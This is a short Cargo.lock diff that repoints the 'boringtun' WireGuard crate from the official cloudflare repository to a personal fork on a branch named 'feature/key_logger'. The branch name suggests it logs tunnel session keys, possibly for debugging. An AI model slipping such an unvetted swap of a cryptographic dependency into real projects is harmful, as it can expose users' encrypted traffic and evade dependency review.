@@ -468,7 +468,7 @@ dependencies = [
 [[package]]
 name = "boringtun"
 version = "0.6.0"
-source = "git+https://github.com/cloudflare/boringtun?rev=e3252d9c4f4c8fc628995330f45369effd4660a1#e3252d9c4f4c8fc628995330f45369effd4660a1"
+source = "git+https://github.com/ntqbit/boringtun?branch=feature/key_logger#0437b44b3d34bf74cd364f51f62c8ac3f4b6962d"
 dependencies = [
  "aead",
  "base64 0.13.1",
